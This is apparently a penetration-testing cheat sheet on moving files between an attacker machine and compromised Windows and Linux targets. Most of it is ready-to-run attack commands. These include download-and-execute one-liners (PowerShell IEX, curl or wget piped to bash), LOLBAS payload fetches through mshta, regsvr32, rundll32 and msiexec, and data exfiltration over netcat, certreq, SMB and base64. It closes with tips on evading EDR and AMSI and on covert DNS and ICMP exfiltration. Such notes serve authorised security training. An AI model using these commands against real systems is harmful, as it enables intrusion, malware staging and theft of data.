# File Transfers

Transfer files between attacker and target systems using various protocols and techniques for both Windows and Linux.
Essential for moving tools, exploits, and exfiltrating data during privilege escalation and post-exploitation phases.

## Windows File Downloads

### PowerShell Web Downloads

#### Invoke-WebRequest (wget/curl/iwr)
```powershell
# Download and save to disk
Invoke-WebRequest http://10.10.14.5/nc.exe -OutFile nc.exe
wget http://10.10.14.5/nc.exe -OutFile nc.exe
iwr http://10.10.14.5/nc.exe -OutFile nc.exe

# Download with UseBasicParsing (bypass IE first-run)
Invoke-WebRequest http://10.10.14.5/nc.exe -UseBasicParsing -OutFile nc.exe

# Download and execute in memory
IEX(iwr -Uri http://10.10.14.5/script.ps1 -UseBasicParsing)

# Custom User-Agent
Invoke-WebRequest http://10.10.14.5/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile nc.exe
```

#### WebClient Class
```powershell
# Download to disk
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','nc.exe')

# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')

# Async download
(New-Object Net.WebClient).DownloadFileAsync('http://10.10.14.5/nc.exe','nc.exe')
```

#### Bypass SSL Certificate Validation
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
(New-Object Net.WebClient).DownloadFile('https://10.10.14.5/nc.exe','nc.exe')
```

### SMB File Transfers

#### Start SMB Server (Attacker)
```bash
# Anonymous SMB server
sudo impacket-smbserver share $(pwd) -smb2support

# Authenticated SMB server
sudo impacket-smbserver share $(pwd) -smb2support -username user -password pass
```

#### Download from SMB (Target)
```cmd
# Anonymous access (older Windows)
copy \\10.10.14.5\share\nc.exe nc.exe

# Authenticated access
net use \\10.10.14.5\share /user:user pass
copy \\10.10.14.5\share\nc.exe nc.exe

# Mount as network drive
net use n: \\10.10.14.5\share /user:user pass
copy n:\nc.exe nc.exe
```

### FTP File Transfers

#### Start FTP Server (Attacker)
```bash
sudo python3 -m pyftpdlib --port 21
```

#### Download via FTP (Target)
```powershell
# PowerShell FTP download
(New-Object Net.WebClient).DownloadFile('ftp://10.10.14.5/nc.exe','nc.exe')
```

```cmd
# CMD FTP with command file
echo open 10.10.14.5 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET nc.exe >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### Certutil
```cmd
# Download file (detectable by AMSI)
certutil.exe -urlcache -split -f http://10.10.14.5/nc.exe nc.exe
certutil.exe -verifyctl -split -f http://10.10.14.5/nc.exe
```

### Bitsadmin
```cmd
# Download with bitsadmin
bitsadmin /transfer job /priority foreground http://10.10.14.5/nc.exe C:\Users\Public\nc.exe
```

```powershell
# PowerShell BitsTransfer
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.14.5/nc.exe" -Destination "C:\Users\Public\nc.exe"
```

### RDP File Transfers

#### Mount Local Directory via RDP
```bash
# Mount local folder when connecting
xfreerdp /v:10.10.10.10 /u:user /p:pass /drive:share,/home/attacker/tools

# Domain-joined RDP
xfreerdp /v:10.10.10.10 /u:'domain\user' /p:pass /drive:share,/home/attacker/tools
```

#### Copy Files via RDP
```cmd
# On target, copy from mounted share
copy \\tsclient\share\nc.exe nc.exe
```

### Evil-WinRM File Transfers

#### Upload File
```powershell
# From Evil-WinRM session
*Evil-WinRM* PS C:\> upload /opt/tools/nc.exe
```

#### Download File
```powershell
# From Evil-WinRM session
*Evil-WinRM* PS C:\> download C:\Users\user\file.txt
```

### Base64 Encoding (Clipboard Transfer)

#### Encode on Attacker
```bash
# Encode file
cat nc.exe | base64 -w 0; echo
```

#### Decode on Target
```powershell
# Decode and write to file
[IO.File]::WriteAllBytes("C:\Users\Public\nc.exe",[Convert]::FromBase64String("<base64_string>"))
```

#### Verify Integrity
```bash
# Attacker
md5sum nc.exe
```

```powershell
# Target
Get-FileHash C:\Users\Public\nc.exe -Algorithm MD5
```

## Linux File Downloads

### Wget
```bash
# Download file
wget http://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh

# Download with custom headers
wget --header="Authorization: Bearer token" http://10.10.14.5/file.txt
```

### Curl
```bash
# Download file
curl http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh

# Download and execute
curl http://10.10.14.5/script.sh | bash

# Follow redirects
curl -L http://10.10.14.5/file.txt -o file.txt
```

### SCP (SSH)

#### Start SSH Server (Attacker)
```bash
sudo systemctl start ssh
sudo systemctl enable ssh
netstat -lnpt | grep 22
```

#### Download via SCP (Target)
```bash
# Download from attacker
scp user@10.10.14.5:/path/to/file.txt /tmp/file.txt

# Upload to attacker
scp /tmp/file.txt user@10.10.14.5:/path/to/destination/
```

### Bash /dev/tcp
```bash
# Connect to web server
exec 3<>/dev/tcp/10.10.14.5/80

# Send HTTP request
echo -e "GET /file.txt HTTP/1.1\nHost: 10.10.14.5\n\n" >&3

# Read response
cat <&3 > file.txt
```

### Python
```bash
# Python 2
python -c 'import urllib; urllib.urlretrieve("http://10.10.14.5/file.txt", "/tmp/file.txt")'

# Python 3
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.10.14.5/file.txt", "/tmp/file.txt")'
```

### Fileless Execution (Pipes)
```bash
# Curl to bash
curl http://10.10.14.5/script.sh | bash

# Wget to bash
wget -qO- http://10.10.14.5/script.sh | bash

# Wget to python
wget -qO- http://10.10.14.5/script.py | python3
```

### OpenSSL File Transfer

#### Server (Attacker)
```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Start server
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/linpeas.sh
```

#### Client (Target)
```bash
# Download file
openssl s_client -connect 10.10.14.5:80 -quiet > linpeas.sh
```

## Windows File Uploads

### PowerShell Web Upload

#### Start Web Server with Upload (Attacker)
```python
# Python upload server
python3 -m uploadserver 8000
```

#### Upload via PowerShell (Target)
```powershell
# Upload file
Invoke-RestMethod -Uri http://10.10.14.5:8000/upload -Method Post -InFile C:\Users\Public\file.txt
```

### SMB Upload

#### Upload to SMB Share (Target)
```cmd
# Copy file to attacker's SMB share
copy C:\Users\Public\file.txt \\10.10.14.5\share\file.txt
```

### Base64 Exfiltration

#### Encode on Target
```powershell
# Encode file
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Public\file.txt"))
```

#### Decode on Attacker
```bash
# Decode base64 string
echo "<base64_string>" | base64 -d > file.txt
```

### Certreq Upload (LOLBAS)

#### Start Listener (Attacker)
```bash
sudo nc -lvnp 8000
```

#### Upload via Certreq (Target)
```cmd
certreq.exe -Post -config http://10.10.14.5:8000/ C:\Users\Public\file.txt
```

## Linux File Uploads

### SCP Upload
```bash
# Upload to attacker
scp /tmp/file.txt user@10.10.14.5:/path/to/destination/
```

### Curl Upload
```bash
# Upload via POST
curl -X POST http://10.10.14.5:8000/upload -F "file=@/tmp/file.txt"

# Upload with authentication
curl -X POST http://10.10.14.5:8000/upload -F "file=@/tmp/file.txt" -u user:pass
```

### Netcat Upload

#### Listener (Attacker)
```bash
nc -lvnp 4444 > received_file.txt
```

#### Send File (Target)
```bash
cat /tmp/file.txt | nc 10.10.14.5 4444
```

### Base64 Exfiltration

#### Encode on Target
```bash
cat /tmp/file.txt | base64 -w 0
```

#### Decode on Attacker
```bash
echo "<base64_string>" | base64 -d > file.txt
```

## HTTP Servers (Attacker)

### Python HTTP Server
```bash
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# Bind to specific interface
python3 -m http.server 8000 --bind 10.10.14.5
```

### PHP HTTP Server
```bash
php -S 0.0.0.0:8000
```

### Ruby HTTP Server
```bash
ruby -run -ehttpd . -p8000
```

### Busybox HTTP Server
```bash
busybox httpd -f -p 8000
```

## LOLBAS / GTFOBins

### Windows LOLBAS Binaries

#### Certutil
```cmd
certutil.exe -urlcache -split -f http://10.10.14.5/nc.exe nc.exe
```

#### Bitsadmin
```cmd
bitsadmin /transfer job /priority foreground http://10.10.14.5/nc.exe C:\Users\Public\nc.exe
```

#### Mshta
```cmd
mshta http://10.10.14.5/payload.hta
```

#### Regsvr32
```cmd
regsvr32 /s /n /u /i:http://10.10.14.5/file.sct scrobj.dll
```

### Linux GTFOBins

#### Wget
```bash
wget http://10.10.14.5/file.txt -O /tmp/file.txt
```

#### Curl
```bash
curl http://10.10.14.5/file.txt -o /tmp/file.txt
```

#### OpenSSL
```bash
openssl s_client -connect 10.10.14.5:80 -quiet > file.txt
```

#### Nc (Netcat)
```bash
nc 10.10.14.5 4444 < /tmp/file.txt
```

## Living Off the Land

### Windows Native Tools

#### Rundll32
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://10.10.14.5/payload.sct")
```

#### Msiexec
```cmd
msiexec /quiet /i http://10.10.14.5/payload.msi
```

#### Regasm/Regsvcs
```cmd
regasm.exe /U http://10.10.14.5/payload.dll
```

### Linux Native Tools

#### Bash
```bash
bash -c 'cat < /dev/tcp/10.10.14.5/80 > /tmp/file.txt'
```

#### Perl
```bash
perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "http://10.10.14.5/file.txt"); my $file = $ff->fetch() or die $ff->error;'
```

#### Ruby
```bash
ruby -e 'require "open-uri"; download = open("http://10.10.14.5/file.txt"); IO.copy_stream(download, "/tmp/file.txt")'
```

## Transferring Between Internal Hosts

### Windows to Windows

#### SMB
```cmd
# From source
copy C:\file.txt \\target\C$\Users\Public\file.txt

# With credentials
net use \\target\C$ /user:domain\user password
copy C:\file.txt \\target\C$\Users\Public\file.txt
```

#### RDP Clipboard
```cmd
# Enable clipboard sharing in RDP session
# Copy/paste files directly
```

### Linux to Linux

#### SCP
```bash
scp /tmp/file.txt user@target:/tmp/file.txt
```

#### Netcat
```bash
# On receiver
nc -lvnp 4444 > file.txt

# On sender
cat file.txt | nc target 4444
```

### Windows to Linux

#### SCP from Windows
```powershell
# Using OpenSSH client (Windows 10+)
scp C:\file.txt user@10.10.10.10:/tmp/file.txt
```

#### SMB from Linux
```bash
# Mount Windows share
smbclient //10.10.10.10/share -U user
get file.txt
```

### Linux to Windows

#### SMB to Windows
```bash
# Copy to Windows share
smbclient //10.10.10.10/C$ -U user
put file.txt Users/Public/file.txt
```

## Notes

**Detection Considerations:**
- PowerShell downloads are heavily monitored by EDR/AV
- Certutil is flagged by AMSI and most security products
- Use obfuscation or alternative methods in hardened environments
- Base64 encoding can bypass simple content filters but not behavioral detection

**File Size Limitations:**
- Clipboard/base64 transfers limited by command line length (8,191 chars in cmd.exe)
- Web shells may timeout on large file transfers
- Consider splitting large files or using alternative methods

**Protocol Selection:**
- SMB is native to Windows environments and often less suspicious
- HTTP/HTTPS blends with normal web traffic
- SSH/SCP requires authentication but is encrypted
- FTP is unencrypted and easily detected

**Integrity Verification:**
- Always verify file integrity with MD5/SHA256 hashes
- Corruption can occur during transfer, especially with base64 encoding
- Use checksums before and after transfer

**Firewall Considerations:**
- Outbound HTTP/HTTPS (80/443) usually allowed
- SMB (445) often blocked at network perimeter
- SSH (22) may be restricted
- Consider using allowed protocols or tunneling

**Living Off the Land:**
- LOLBAS (Windows) and GTFOBins (Linux) provide native binary abuse techniques
- These methods use legitimate system binaries to avoid detection
- Check respective websites for full lists and usage examples

**Alternative Methods:**
- DNS exfiltration for small amounts of data
- ICMP tunneling when other protocols blocked
- Steganography for covert data hiding
- Cloud storage services (Dropbox, Google Drive) if internet access available
